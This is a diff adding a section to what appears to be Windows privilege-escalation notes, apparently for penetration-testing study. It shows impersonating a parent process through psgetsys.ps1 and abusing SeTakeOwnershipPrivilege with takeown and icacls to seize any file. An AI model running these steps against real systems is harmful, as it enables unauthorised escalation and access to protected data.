@@ -540,6 +540,13 @@ Must in elevated command prompt
 . .\psgetsys.ps1(. . means dot sourcing the script)
 ImpersonateFromParentPid -ppid <parentpid> -command <command to execute> -cmdargs <command arguments>
 ```
+### Abuse SeTakeOwnershipPrivilege
+>SeTakeOwnershipPrivilege grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes.
+```
+Enable the privilege by Import-Module .\Enable-Privilege.ps1 and .\EnableAllTokenPrivs.ps1 with elevated prompt
+takeown /f 'filepath'
+icacls 'filepath' /grant current-user:F
+```
 
 ### PowerUp.ps1
 ```
